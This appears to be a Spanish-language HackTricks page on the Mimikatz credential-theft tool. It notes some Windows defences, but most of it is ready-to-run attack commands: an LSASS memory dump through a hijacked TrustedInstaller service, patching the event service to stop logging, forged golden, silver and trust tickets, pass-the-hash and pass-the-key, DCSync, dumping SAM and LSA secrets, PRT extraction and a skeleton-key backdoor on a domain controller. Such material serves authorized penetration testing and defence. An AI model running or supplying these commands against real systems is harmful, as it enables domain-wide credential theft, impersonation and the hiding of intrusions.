# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Esta página está basada en una de [adsecurity.org](https://adsecurity.org/?page_id=1821)**. ¡Consulta la original para más información!

## LM and Clear-Text in memory

A partir de Windows 8.1 y Windows Server 2012 R2, se han implementado medidas significativas para proteger contra el robo de credenciales:

- **LM hashes y contraseñas en texto plano** ya no se almacenan en memoria para mejorar la seguridad. Una configuración específica del registro, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ debe configurarse con un valor DWORD de `0` para deshabilitar Digest Authentication, asegurando que las contraseñas en "clear-text" no se almacenen en caché en LSASS.

- **LSA Protection** se introduce para proteger el proceso Local Security Authority (LSA) frente a la lectura no autorizada de memoria y la inyección de código. Esto se logra marcando LSASS como un proceso protegido. La activación de LSA Protection implica:
1. Modificar el registro en _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ estableciendo `RunAsPPL` en `dword:00000001`.
2. Implementar un Group Policy Object (GPO) que aplique este cambio de registro en todos los dispositivos administrados.

A pesar de estas protecciones, herramientas como Mimikatz pueden eludir LSA Protection usando drivers específicos, aunque es probable que estas acciones queden registradas en los event logs.

En workstations modernas esto es aún más importante porque **Credential Guard está habilitado por defecto en muchos sistemas Windows 11 22H2+ y Windows Server 2025 unidos a un domain, no-DC**, mientras que **LSASS-as-PPL está habilitado por defecto en instalaciones nuevas de Windows 11 22H2+**. En la práctica, esto significa que `sekurlsa::logonpasswords` a menudo obtiene menos material del que esperaban las técnicas antiguas, y los operadores cada vez se apoyan más en **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, o módulos orientados a **CloudAP/PRT**. Para la parte de protección, consulta [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Los administradores suelen tener SeDebugPrivilege, lo que les permite depurar programas. Este privilegio puede restringirse para evitar volcado de memoria no autorizado, una técnica común usada por atacantes para extraer credenciales de la memoria. Sin embargo, incluso con este privilegio eliminado, la cuenta TrustedInstaller aún puede realizar memory dumps usando una configuración de servicio personalizada:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Esto permite volcar la memoria de `lsass.exe` a un archivo, que luego puede analizarse en otro sistema para extraer credenciales:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

La manipulación de event log en Mimikatz implica dos acciones principales: borrar los event logs y parchear el servicio Event para impedir el registro de nuevos eventos. A continuación se muestran los comandos para realizar estas acciones:

#### Clearing Event Logs

- **Command**: Esta acción está orientada a eliminar los event logs, dificultando el seguimiento de actividades maliciosas.
- Mimikatz no proporciona un comando directo en su documentación estándar para borrar event logs directamente desde su línea de comandos. Sin embargo, la manipulación de event log normalmente implica usar herramientas del sistema o scripts fuera de Mimikatz para borrar logs específicos (por ejemplo, usando PowerShell o Windows Event Viewer).

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- Este comando experimental está diseñado para modificar el comportamiento del Event Logging Service, evitando de forma efectiva que registre nuevos eventos.
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- El comando `privilege::debug` asegura que Mimikatz opere con los privilegios necesarios para modificar system services.
- El comando `event::drop` luego parchea el servicio Event Logging.

### Kerberos Ticket Attacks

Usa los comandos siguientes como recordatorios rápidos de sintaxis. Las páginas dedicadas a [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), y [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) contienen los matices actualizados de AES/PAC/opsec.

### Golden Ticket Creation

Un Golden Ticket permite la suplantación de acceso a nivel de dominio. Comando y parámetros clave:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: El nombre del dominio.
- `/sid`: El Security Identifier (SID) del dominio.
- `/user`: El nombre de usuario a suplantar.
- `/krbtgt`: El hash NTLM de la cuenta de servicio KDC del dominio.
- `/ptt`: Inyecta directamente el ticket en memoria.
- `/ticket`: Guarda el ticket para uso posterior.

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Creación de Silver Ticket

Los Silver Tickets otorgan acceso a servicios específicos. Comando y parámetros clave:

- Command: Similar a Golden Ticket pero apunta a servicios específicos.
- Parameters:
- `/service`: El servicio a atacar (p. ej., cifs, http).
- Otros parámetros similares a Golden Ticket.

Example:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Creación de Trust Ticket

Los Trust Tickets se usan para acceder a recursos entre dominios aprovechando relaciones de confianza. Comando y parámetros clave:

- Command: Similar a Golden Ticket but for trust relationships.
- Parameters:
- `/target`: El FQDN del dominio de destino.
- `/rc4`: El hash NTLM de la cuenta de confianza.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Comandos adicionales de Kerberos

- **Listar Tickets**:

- Command: `kerberos::list`
- Lista todos los tickets de Kerberos para la sesión actual del usuario.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Inyecta tickets de Kerberos desde archivos de caché.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Permite usar un ticket de Kerberos en otra sesión.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purgar Tickets**:
- Command: `kerberos::purge`
- Borra todos los tickets de Kerberos de la sesión.
- Útil antes de usar comandos de manipulación de tickets para evitar conflictos.

### Over-Pass-the-Hash / Pass-the-Key

Si `RC4` está deshabilitado o no es fiable, Mimikatz puede parchear las claves Kerberos **AES128/AES256** en la sesión de inicio actual en lugar de usar solo un hash NT. Esto suele encajar mejor con dominios modernos que tratar `sekurlsa::pth` como NTLM-only.
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` reutiliza el proceso actual en lugar de abrir una nueva consola, lo cual es útil cuando quieres ejecutar de inmediato cosas como `lsadump::dcsync` en el mismo contexto.

### Active Directory Tampering

- **DCShadow**: Haz temporalmente que una máquina actúe como un DC para la manipulación de objetos de AD. Ver [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Imita un DC para solicitar datos de contraseñas. Ver [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: Extrae credenciales de LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Suplanta a un DC usando los datos de contraseña de una cuenta de equipo.

- _No se proporciona un comando específico para NetSync en el contexto original._

- **LSADUMP::SAM**: Accede a la base de datos local SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Descifra secretos almacenados en el registro.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Establece un nuevo hash NTLM para un usuario.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Recupera información de autenticación de confianza.
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

En hosts **Entra ID** o **hybrid-joined**, `sekurlsa::cloudap` puede exponer material de **Primary Refresh Token (PRT)** almacenado en caché desde LSASS. Si la Proof-of-Possession key asociada está protegida por software, `dpapi::cloudapkd` puede derivar el material de clave en claro/derivada necesario para flujos posteriores de **Pass-the-PRT**.
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Esto se vuelve mucho más difícil cuando la clave está respaldada por TPM, pero vale la pena comprobarlo en endpoints híbridos porque los datos almacenados en caché de CloudAP pueden ser más interesantes que la salida clásica de `wdigest`. Para la cadena de abuso del lado cloud, consulta [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Miscellaneous

- **MISC::Skeleton**: Inyecta una puerta trasera en LSASS en un DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Obtén privilegios de backup.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Obtén privilegios de debug.
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Muestra credenciales de usuarios con sesión iniciada.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Extrae tickets de Kerberos de la memoria.
- `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Cambia SID y SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _No se proporcionó ningún comando específico para modify en el contexto original._

- **TOKEN::Elevate**: Suplanta tokens.
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Permite múltiples sesiones RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lista sesiones TS/RDP.
- _No se proporcionó ningún comando específico para TS::Sessions en el contexto original._

### Vault

- Extrae passwords de Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## References

- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)

{{#include ../../banners/hacktricks-training.md}}
